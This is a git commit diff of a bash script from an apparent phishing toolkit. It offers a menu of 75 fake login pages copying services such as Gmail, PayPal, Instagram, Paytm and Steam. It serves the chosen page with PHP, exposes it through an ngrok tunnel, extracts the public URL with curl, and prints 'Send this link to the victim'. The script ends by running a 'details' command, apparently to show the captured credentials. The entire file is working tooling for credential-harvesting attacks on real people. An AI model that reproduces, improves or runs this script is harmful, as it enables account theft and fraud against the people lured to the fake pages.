c8a14c1a9f896791a04936b176ab38253c7141c0
karansharmahr <63999241+karansharmahr@users.noreply.github.com>
2021-01-09 21:54:13 +0530

    All.sh

--- all.sh
+++ all.sh
@@ -1,63 +1,141 @@
 #! /bin/bash
-echo -e "\e[31m"
-figlet -f big  KARAN
+clear
+killall php >  /dev/null 2>&1  &
+killall ngrok > /dev/null 2>&1  &
 
-echo -e "\e[32m"
-read -p "press enter to continue : "
+sleep 3
+
+
+echo -e "\e[33m"
+
+
+
 echo "Welcome to the world of hacking :-)"
-figlet -f big phishing
-echo " KARAN'S HACKING WORLD:-)"
+
+echo ""
+echo ""
+echo ""
+
+
+
+echo " ________________________¶
+______________________¶¶¶
+___________________¶¶¶¶¶
+__________________¶¶¶¶¶¶
+________________¶¶¶¶¶¶¶
+_______________¶¶¶¶¶¶¶¶
+_______________¶¶¶¶¶¶¶¶
+______________¶¶¶¶¶¶¶¶¶¶
+______________¶¶¶¶¶¶¶¶¶¶_________________¶
+______________¶¶¶¶¶¶¶¶¶¶¶______________¶¶¶
+______________¶¶¶¶¶¶¶¶¶¶¶¶___________¶¶¶¶
+_______¶______¶¶¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶
+_______¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶
+_______¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶
+_______¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶
+_______¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_______¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+______¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_____¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶______¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶________¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________¶____¶¶¶¶¶¶¶¶¶¶¶
+__¶¶¶¶¶¶¶¶¶¶¶¶_____________________¶¶¶¶¶¶¶¶¶
+____¶¶¶¶¶¶¶¶¶¶_____________________¶¶¶¶¶¶¶¶
+______¶¶¶¶¶¶¶¶_____________________¶¶¶¶¶¶
+_________¶¶¶¶¶¶___________________¶¶¶¶
+_____________¶¶¶¶¶______________¶" | lolcat
+
+
+
+
+
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e "\e[35m"
+read -p " Press enter to continue :- "
+
+
+clear
+
+echo   "
+█████╗██████ █████ ╗ ██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+██╔═════██   ██╔══██╗██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║
+█████╗  ██║  ███████║██████╔╝██████╔╝███████║██║███████╗███████║
+╚ ═██   ██║  ██╔══██║██╔══██╗██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+█████   ██║  ██║  ██║██║  ██║██║     ██║  ██║██║███████║██║  ██║
+                                                                    " | lolcat
+
+
+
 
 echo -e "\e[36m"
 echo "Available phishing pages"
 echo "
-
-   GitHub                     fb_standard           pinterest
-   Instagram_VerifiedBadge    flipkart              playstation
-   Instagram_advanced_attack  freefire              pornhub
-   Instagram_autoliker        gitlab                protonmail
-   Instagram_web              gmail                 pubg
-   Microsoft                  google_advanced_poll  quora
-   Reddit-old                 google_standard       spotify
-   Snapchat                   gpay                  stackoverflow
-   Snapchat_web               hotstar               steam
-   TOOLS                      iCloud                subitoit
-   VK                         instafollowers        telegram
-   VK_poll_method             jio                   tiktok
-   adobe                      jiooffer              tplink
-   airtel                     jiorouter             twitch
-   airtel-wifi                linkedin              twitter
-   apple                      live_web              verizon
-   badoo                      messenger             whatsapp
-   clash-of-clans             mobikwik              wifi
-   cryptocurrency             myspace               wordpress
-   devianart                  netflix               xbox
-   dropbox                    origin                yahoo_web
-   ebay                       paypal                yandex
-   fb_advanced_poll           paytm                 ytsubs
-   fb_messenger               paytmoffer            google_advanced_web
-   shopif                     fb_security_fake      phonepay"
-
-
+   1.GitHub                      2.fb_standard           3.pinterest
+   4.Instagram_VerifiedBadge     5.flipkart              6.playstation
+   7.Instagram_advanced_attack   8.freefire              9.pornhub
+   10.Instagram_autoliker        11.gitlab               12. protonmail
+   13.Instagram_web              14.gmail                15.pubg
+   16.Microsoft                  17.google_advanced_poll 18.quora
+   19.Reddit-old                 20.google_standard      21.spotify
+   22.Snapchat                   23.gpay                 24.stackoverflow
+   25.Snapchat_web               26.hotstar              27.steam
+   28.TOOLS                      29.iCloud               30.subitoit
+   31.VK                         32..instafollowers      33.telegram
+   34.VK_poll_method             35.jio                  36. tiktok
+   37.adobe                      38.jiooffer             39.tplink
+   40.airtel                     41.jiorouter            42.twitch
+   43.airtel-wifi                44.linkedin             45.twitter
+   46.apple                      47.live_web             48.verizon
+   49.badoo                      50.messenger            51.whatsapp
+   52.clash-of-clans             53.mobikwik             54.wifi
+   55.cryptocurrency             56.myspace              57.wordpress
+   58.devianart                  59.netflix              60.xbox
+   61.dropbox                    62.origin               63.yahoo_web
+   64.ebay                       65.paypal               66.yandex
+   67.fb_advanced_poll           68.paytm                69.ytsubs
+   70.fb_messenger               71.paytmoffer           72.google_advanced_web
+   73.shopif                     74.fb_security_fake     75.phonepay" | lolcat
 
 
 
 
 echo -e "\e[33m"
 read -p "Phishing site:-~ " page
-read -p "port number:-~ " number
 cd /$HOME/Phishing/WebPages/$page
+echo ""
+echo ""
+echo ""
 
 
-echo -e "\e[96m"
-          echo "Copy the link"
+echo -e "\e[32m......................\e[31mStarting Server!\e[32m...................."
+                           php -S 127.0.0.1:5000 > /dev/null 2>&1 &
+                           sleep 3
 
+echo ""
+echo ""
 
-echo -e "http://localhost:$number"
-echo -e "\e[35m"
- php -S localhost:$number > /dev/null &
 cd $HOME
+./ngrok http 5000 > /dev/null &
+sleep 15
+link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
 
+
+echo "Send this link to the victim --    $link" | lolcat
+
+
+
+
+cd $HOME
+echo -e "\e[96m"
 cd $HOME
 cd /$HOME/Phishing/WebPages/$page
 details
